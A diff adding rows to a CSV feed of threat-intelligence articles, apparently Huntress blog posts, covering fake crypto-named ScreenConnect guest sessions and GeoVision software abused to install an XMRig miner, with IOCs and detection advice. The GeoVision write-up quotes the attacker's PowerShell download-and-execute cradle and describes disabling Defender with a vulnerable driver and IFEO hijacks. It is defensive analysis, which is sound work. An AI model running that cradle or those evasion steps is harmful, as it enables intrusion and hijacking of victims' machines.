@@ -1,4 +1,336 @@
 ID,Story,Date,Category,Vendor,Source,Modules,Type,Title,Link,Context,Full Text
+fe6516707821,890ee50f8873,2026-11-14 01:50 UTC,"Attacks, Breaches & Threat Intel",Huntress,Huntress Blog,Vulnerability Management; Server & Workload Protection,Article,Attackers use Crypto Exchange Names to Disguise Unauthorized Sessions on 100+ ScreenConnect Servers,https://www.huntress.com/blog/fake-crypto-exchange-sessions-screenconnect,"That could create an opportunity to exploit a client-side vulnerability such as CVE-2026-84869, a critical ScreenConnect vulnerability disclosed September 8","Background
+
+On November 12, 2026, an MSP asked us about a handful of unfamiliar machines in their self-hosted ScreenConnect console. Named after various crypto exchanges, the machines had no apparent company or owner and claimed to be online. Nobody at the MSP had installed them.
+
+The MSP's server itself was clean. We found no evidence of web shells, suspicious child processes, or new accounts. The sessions were real entries in the server's database, though, so we turned the question around: If one server had these guests, how many others did?
+
+We collected the ScreenConnect session database (App_Data\Session.db) from the Huntress-protected ScreenConnect servers we could reach and looked for the same pattern. As of this writing, we've found 2,223 fake sessions on 118 servers across 109 MSP and organization accounts.
+
+These unauthorized sessions have been added over the course of the past 10 days. Across our telemetry, we could see the first session was enrolled November 3, and the latest one was enrolled November 13.
+
+Huntress has investigated various incidents involving ScreenConnect in the last few months: including rogue ScreenConnect installations seen in September and, most recently, activity linked to the SCKit worm on November 11. We haven't found any overlap between the crypto-bait fakes and the published SCKit indicators.
+
+Figure 1: An overview of the unauthorized sessions found
+
+What do these unauthorized sessions look like?
+
+ScreenConnect is remote desktop software that many MSPs host on their own servers. Technicians connect to customer computers using a host client, and each customer computer runs a guest client. In an unattended ""Access"" session, a guest can stay registered in the server's console even when no technician is connected, appearing in the session list of computers available for access.
+
+Figure 2: Example list of unauthorized sessions in ScreenConnect (image courtesy of Reddit).
+
+Someone is registering unauthorized guest computers on MSPs' servers, where they sit in these session lists. In the console, each one looks like an always-online computer with a crypto-exchange name and a thumbnail of what appears to be a trading desktop.
+
+Figure 3: a collection of thumbnails from unauthorized sessions.
+
+The names all combine an exchange or crypto word with a role word, including KUCOIN-SRV, SRV-BINANCE, BACKUP-PROBIT, WORKSTATION-COINEX and DASH-BITMEX. Overall, we counted over 1,000 distinct fake names across the 2,408 unauthorized guest sessions.
+
+To register, a guest client needs a ScreenConnect server's relay address, which is embedded in that server's guest installer. On the first server we investigated, we found the MSP's Access installer was publicly downloadable. An online file-scanning service retrieved it in mid-October, weeks before the unauthorized sessions appeared. ScreenConnect makes these installers available without authentication by design.
+
+Figure 4: Unauthorized guest sessions created per day.
+
+The majority of these sessions connected from a single IP,74.208.158[.]106, which is IONOS SE-hosted. Another early instance was 197.47.160[.]252, an Egyptian residential IP, which created the first three unauthorized sessions on November 3.
+
+Figure 5: VirusTotal results for 74.208.158[.]106
+
+What happens in an unauthorized session?
+
+In our investigations, we found no evidence of any sort of malicious activity coming from these unauthorized sessions. The file or command events related to them came from the technician's side. In a handful of cases, a technician opened the unauthorized session; most of these connections lasted less than 30 seconds.
+
+In one case, a technician stayed longer and used ScreenConnect's ""send text"" feature twice to type in the remote session, sending keystrokes to the guest. Because ScreenConnect does not retain sent text, we treated this as a possible credential exposure and contacted the MSP. In another case, a technician queued a delete command to remove the unauthorized sessions. The command was delivered, but it never returned any output.
+
+The unauthorized sessions appeared to be actively maintained. Across 29 servers with complete connection histories, we observed a repeating sequence of events: the operator revisited the servers every 151 seconds, creating or reconnecting fake sessions along the way.
+
+Individual connections typically lasted about 64 minutes, and sessions that reconnected did so about every 55 minutes. That repeated connection activity kept the unauthorized sessions appearing online in the console, where they could pass for real computers.
+
+The attacker's possible goals
+
+Why enroll thousands of guest machines that never do anything? One possibility is that the crypto-themed sessions are bait, waiting for a technician to connect. That could create an opportunity to exploit a client-side vulnerability such as CVE-2026-84869, a critical ScreenConnect vulnerability disclosed September 8.
+
+For this flaw, in both Support and Access sessions, a malicious guest could trigger file-transfer actions that an unpatched technician's workstation would accept and run without asking, including with elevated rights. A file could then run on the technician's workstation—often the MSP's most privileged machine.
+
+This is our leading hypothesis, but it's important to note that we have not observed the guest sessions being used this way. We have not seen a crypto-named system push or run a file. We also can't rule out other goals, such as capturing what a technician types into the session.
+
+Public discussion of this activity has also suggested that the fakes come from Joe Sandbox, a malware-analysis service, detonating ScreenConnect installers, which could be dismissed as harmless noise. However, after further investigation, this doesn't seem likely.
+
+While an installer run in a sandbox sends a key and JPEG screenshots of the analysis VM, these guest sessions send no key, reuse seven screenshot families, and randomize hardware and OS details. This aligns with the characteristics of an emulator. Furthermore, the timeline of the guest session campaign shows intent: they revisited 100-plus servers in the same order daily for 10 days and kept sessions online for a week, which does not match what we would expect from a sandbox. We found no confirmation that any of these addresses belong to Joe Security. Public reports show 74.208.158[.]106 as a contacted host that sits in IONOS hosting space, not sandbox egress.
+
+What Should MSPs Do?
+
+MSPs should upgrade ScreenConnect host clients to 26.6.5 or later, along with affected Access agents. If upgrades must wait, they should check ConnectWise's advisory about removing TransferFiles permission from roles and session groups. Server history can identify client versions.
+
+As another precaution, organizations should bar technicians from joining sessions they cannot tie to a customer. Crypto-exchange names, blank company fields, or a mismatched client version should trigger a pause and investigation.
+
+In Access, teams should look for exchange-and-role names, empty company/site fields, guest version 25.3.4.9288, and crypto-site previews. Before deleting fakes, they should preserve App_Data\Session.db and its WAL file.
+
+Session history or a database copy can show whether a technician joined and whether files, commands, or text moved. Reviews should distinguish technician-side from guest-side activity: a fake alone only shows reachability, not exposure. Guest-side file events during a technician connection may indicate CVE-2026-84869 activity. If an unpatched client has joined, the organization should inspect its workstation's ScreenConnect Temp and Startup folders, plus process history.
+
+To limit enrollment, organizations should restrict installer and web access where supported, keep Access installer links private, rebuild leaked installers, and place unfamiliar sessions in a group technicians don't routinely browse. Blocking known, bad IPs can help, but operators may move.
+
+Furthermore, here are some detection opportunities:
+
+Server database: New guest sessions with ClientType 1 (Windows) and an empty guest public key; guest version 25.3.4.9288.
+
+Server logs / SIEM: Many new Access guests from one external IP across a short window, especially 74.208.158[.]106.
+
+Technician workstations: ScreenConnect.WindowsClient.exe starting cmd.exe, powershell.exe, wscript.exe or msiexec.exe with a file under Documents\*\Temp\. That's the host-side shape of CVE-2026-84869 exploitation.
+
+Indicators of Compromise (IOCs)
+
+Item
+
+Description
+
+74.208.158[.]106
+
+IONOS VPS; source of 97.8% of crypto-named guest connections (Nov 3-13, 2026)
+
+197.47.160[.]252
+
+Created the first three unauthorized sessions on Nov 3, 2026, 21:26 UTC
+
+87.106.111[.]220
+
+Related IONOS host (same JARM and TLS certificates as 74.208.158[.]106); no guest sessions observed from it
+
+SHA256:kt6iiIS3kcQ3NsUSVfk7gJoGMSSUqMdXqsmjb+/cSHg
+
+ECDSA SSH host key fingerprint of 74.208.158[.]106, for pivoting
+
+25.3.4.9288
+
+Guest client version claimed by every guest machine (context indicator, not unique on its own)
+
+Session name <EXCHANGE>-<ROLE> / <ROLE>-<EXCHANGE>
+
+e.g. KUCOIN-SRV, LAPTOP-BINANCE, BACKUP-PROBIT, WORKSTATION-COINEX
+
+Empty guest public key + ClientType 1
+
+Combined server-side fingerprint of the emulator
+
+008839ef2a2d54e9efa47013bb23c773d3a152f351e9dfd3b2f4dd27086121df
+
+WebP preview thumbnail (Binance-style page), most-used bait image
+
+45136a9ab47015c4334b881df9daf824a72347daae0b5730ce3bd7d42b204bf2
+
+WebP preview thumbnail (bait image family 2)
+
+e73020645e7a11a90865d93bd7f3d797585f49ef72b1ac7354392a2da7fbd91f
+
+WebP preview thumbnail (bait image family 3)
+
+c15b008b0296b1bc9e0f979e6f25b780e3e89edabb344c7ee8c284a1a140f0d7
+
+WebP preview thumbnail (bait image family 4)
+
+b55ce5130cd2623017cca29318341f6b4656e3a1dc5ab82ce704e912d0d17535
+
+WebP preview thumbnail (bait image family 5)
+
+bea82efc82672225cf29eb869972670754f15941bc61b9e5801ffd41c5c39e5f
+
+WebP preview thumbnail (bait image family 6)
+
+f6d37291c4948b974caf2e9e7e8ca9c2173d2779d1ec0a391488706bbd1a995c
+
+WebP preview thumbnail (bait image family 7)"
+93d785adbff8,93d785adbff8,2026-11-13 14:00 UTC,"Attacks, Breaches & Threat Intel",Huntress,Huntress Blog,Endpoint Security,Article,GeoVision Camera Software Abused to Deploy XMRig Cryptominer,https://www.huntress.com/blog/geovision-camera-software-xmrig-cryptominer,"Figure 2: The attack chain observed by the SOC across multiple organizations What we saw On various endpoints where this software was publicly exposed, we first saw the...","Acknowledgements: Special thanks to Zach Rogers, Cristian Poenaru, Harry Godridge, and Tanner Filip for their contributions to the analysis and triage associated with this investigation and this writeup.
+
+Background
+
+The Huntress SOC observed widespread malicious activity stemming from GeoVision webcam software this week, with the bulk of the attacks occurring between November 8 and November 10. GeoVision is a Taiwanese surveillance and access-control company.
+
+We have seen malicious activity across ten accounts and 13 organizations (all across various industries). All malicious activity stemmed from GeoStartupAgentService.exe; across many endpoints, the activity was run under the NT AUTHORITY\SYSTEM account. A search on Shodan for impacted endpoints' external IPs indicated publicly exposed GeoVision devices or management interfaces.
+
+Figure 1: Suspicious command stemming from GeoStartupAgentService.exe
+
+The detected activity originating from this parent process exhibited a similar attack chain and dropped files across most endpoints. Figure 2 breaks down the attack chain we observed.
+
+Figure 2: The attack chain observed by the SOC across multiple organizations
+
+What we saw
+
+On various endpoints where this software was publicly exposed, we first saw the GeoVision service spawn a command shell:
+
+cmd.exe /c powershell -c iex (new-object net.webclient).downloadstring('hxxp://45[.]32[.]117[[.]]34/a')
+
+The command then led to the launch of various PowerShell scripts both in memory and downloaded to disk (a, b, and c ) from 45.32.117[.]34. The PS1 extension will be added to these to help with readability.
+
+We observed a.ps1 being detonated in memory before searching for writable directories and checking if Microsoft Defender is active on the victim's environment. The secondary script (b.ps1) was written to disk before being detonated using WMI. This script also performed the same writable folder probe as the previous script before downloading kvckiller.sys. Closer inspection via VirusTotal reveals this to be a Windows kernel-mode driver (wsftprm.sys) that's previously been abused in Bring Your Own Vulnerable Driver (BYOVD) attacks as a way for threat actors to tamper with antivirus protections like Microsoft Defender.
+
+Figure 3: VirusTotal search for wsftprm.sys, which has been seen in the wild as kvckiller.sys
+
+At this stage of the attack, we also observed attackers configuring three IFEO Debugger hijacks, which abuse a Windows troubleshooting feature. Image File Execution Options (IFEO) lets administrators configure a ""debugger"" to start when a particular executable is launched. The setting is stored in the Windows Registry under a key named for that executable.
+
+This particular attack targeted Windows Defender components MsMpEng.exe (the Microsoft Defender Antivirus engine), SecurityHealthService.exe (the Windows Security service), and SecurityHealthSystray.exe (the Windows Security notification-area app).
+
+When Windows or another component tries to start one of those executables, the IFEO setting redirected the launch to systray.exe instead. This is a likely attempt to interfere with the launch of those components, as redirecting the launch to systray.exe can keep the intended security process from starting, depending on how the replacement is configured.
+
+Finally, c.ps1 was detonated in memory. This script's main purpose was to download and execute update.exe in the current directory, which was a custom Golang loader (reaching out to 156.246.94[.]183). At the time of the investigation, this IP was associated with the domain cctv-update[.]top, which was registered on November 7 at 02:40 UTC. This binary includes a BitTorrent Mainline DHT client and a PKARR resolver (Public-Key Addressable Resource Records). Together, they let it use a public key to find the server's current addresses on the DHT, allowing the operator to move infrastructure without registering a domain or losing access to it.
+
+On some endpoints, we also saw update.exe set up a scheduled task (PackageUpdater), which was configured to execute C:\WINDOWS\system32\config\systemprofile\update.exe every 15 minutes, which restarts update.exe if it stops. On some endpoints, we also saw the scheduled task PackageUpdater_Startup running at system startup with SYSTEM privileges.
+
+Finally, we observed this loader downloading XMRig (ApplyUpdate.exe), the open-source cryptominer that's been popular with threat actors in various attacks.
+
+Mitigation guidance
+
+This attack is a reminder that internet-exposed software can give attackers a foothold inside an organization. Organizations should remove unnecessary public access to GeoVision devices and management interfaces, placing them behind a VPN or restricting access to trusted IP addresses.
+
+Organizations running GeoVision should also look for signs of compromise, including unexpected command shells or PowerShell launched by GeoStartupAgentService.exe, and review the indicators listed in this advisory. If malicious activity is found, defenders should isolate impacted hosts and preserve evidence before removing files or changing configurations.
+
+Additionally, based on our static analysis of update.exe, we have identified several more detection opportunities for organizations:
+
+DNS queries to 8.8.8[.]8, 8.8.4[.]4, or 1.1.1[.]1 initiated by a process other than the system DNS client
+
+Outbound UDP DHT traffic on port 6881 or similar from a GeoVision server/process WebCamServer.exe
+
+schtasks /Create commands launched by update.exe
+
+Finally, the Huntress SOC has seen several previous incidents involving attackers targeting camera systems in order to carry out malicious activity. Organizations should treat camera management applications and software as part of the enterprise attack surface.
+
+Indicators of Compromise (IOCs)
+
+Item
+
+Description
+
+ApplyUpdate.exe
+
+XMRig miner
+
+PowerShell Files: a, b, c
+
+SHA256:
+
+b673c4d707828abedc767a2be6badef7454492e62c37e30cf3cc5a402fd3647b
+
+PowerShell scripts observed in the attacks
+
+wsftprm.sys
+
+Kvckiller.sys
+
+SHA256:
+
+ff5dbdcf6d7ae5d97b6f3ef412df0b977ba4a844c45b30ca78c0eeb2653d69a8
+
+Vulnerable driver abused in incident
+
+2.59.133[.]151
+
+WebCamServer.exe observed reaching out to this IP. Likely source of exploitation
+
+45.32.117[.]34
+
+IP that PowerShell scripts (a, b, and c ) were launched from
+
+156.246.94[.]183
+
+IP address that the custom Golang loader (update.exe) was reaching out to
+
+cctv-update[.]top
+
+The IP 156.246.94[.]183 resolved to this domain
+
+update.exe
+
+SHA256: f1235751c9e48e5732b7b183dc2bb175a19e4c6401dfd0e96b4cfdd0d8c54b4c
+
+Golang binary
+
+PackageUpdater
+
+PackageUpdater_Startup
+
+Scheduled tasks
+
+MITRE ATT&CK
+
+Tactic
+
+Technique
+
+Context
+
+Resource Development
+
+Stage Capabilities: Upload Malware (T1608.001)
+
+The threat actor hosted the PowerShell scripts a, b, and c on 45.32.117[.]34, and exploited endpoints retrieved and launched them from that server.
+
+Initial Access
+
+Exploit Public-Facing Application (T1190)
+
+The threat actor exploited publicly exposed GeoVision webcam software across nine accounts and 13 organizations. All malicious activity stemmed from GeoStartupAgentService.exe on endpoints whose external IPs Shodan tied to publicly exposed GeoVision devices or management interfaces.
+
+Execution
+
+Scheduled Task/Job: Scheduled Task (T1053.005)
+
+The PackageUpdater scheduled task executed C:\WINDOWS\system32\config\systemprofile\update.exe, the threat actor's Golang loader, every 15 minutes.
+
+Execution
+
+Command and Scripting Interpreter: PowerShell (T1059.001)
+
+The threat actor ran a PowerShell download cradle, powershell -c iex (new-object net.webclient).downloadstring('hxxp://45.32.117[.]34/a'), which launched the later scripts b and c.
+
+Execution
+
+Command and Scripting Interpreter: Windows Command Shell (T1059.003)
+
+The exploited GeoStartupAgentService.exe process spawned a command shell, on many endpoints under the NT AUTHORITY\SYSTEM account, to launch PowerShell.
+
+Persistence
+
+Scheduled Task/Job: Scheduled Task (T1053.005)
+
+On some endpoints, the threat actor's malware created the scheduled task PackageUpdater, which ran update.exe every 15 minutes, and PackageUpdater_Startup, which ran at system startup with SYSTEM privileges. Both tasks were designed to create persistence.
+
+Defense Impairment
+
+Modify Registry (T1112)
+
+The threat actor wrote three IFEO Debugger settings to the Windows Registry, under keys named for the Microsoft Defender and Windows Security executables, to redirect their launch to systray.exe.
+
+Defense Impairment
+
+Disable or Modify Tools (T1685)
+
+The threat actor's PowerShell scripts attempted to disable Microsoft Defender. They also configured IFEO Debugger hijacks that redirected launches of MsMpEng.exe, SecurityHealthService.exe and SecurityHealthSystray.exe to systray.exe, likely to keep those security components from starting.
+
+Discovery
+
+File and Directory Discovery (T1083)
+
+The threat actor's scripts a and b each searched the endpoint for writable directories before taking further action.
+
+Discovery
+
+Software Discovery: Security Software Discovery (T1518.001)
+
+The threat actor's script a checked whether Microsoft Defender was active in the victim's environment.
+
+Command and Control
+
+Ingress Tool Transfer (T1105)
+
+The threat actor's script b downloaded kvckiller.sys, a Windows kernel-mode driver that VirusTotal identifies as wsftprm.sys, and c downloaded the custom Golang loader update.exe. The loader then downloaded the XMRig cryptominer as ApplyUpdate.exe.
+
+Command and Control
+
+Dynamic Resolution (T1568)
+
+The threat actor's update.exe loader, which reached out to 156.246.94[.]183, included a BitTorrent Mainline DHT client and a PKARR resolver. Together they used a public key to find the server's current addresses on the DHT, which let the operator move infrastructure without registering a domain.
+
+Impact
+
+Resource Hijacking: Compute Hijacking (T1496.001)
+
+The threat actor deployed the XMRig cryptominer (ApplyUpdate.exe) on exploited endpoints to hijack their compute resources for cryptocurrency mining."
 10ed288c8b94,10ed288c8b94,2026-11-12 14:00 UTC,"Attacks, Breaches & Threat Intel",Huntress,Huntress Blog,Email and Collaboration Security; Threat Intelligence; Identity Security Posture Management,Article,Crafty Microsoft Teams Booking Flow Disguises Device Code Phishing,https://www.huntress.com/blog/crafty-microsoft-teams-booking-flow-disguises-device-code-phishing,"While the Huntress SOC quickly contained this attack, it shows how threat actors are adapting device code phishing into more convincing social-engineering ploys that disguise...","Acknowledgments: Special thanks to Andrew Brandt for contributions to this investigation and writeup.
 
 Background
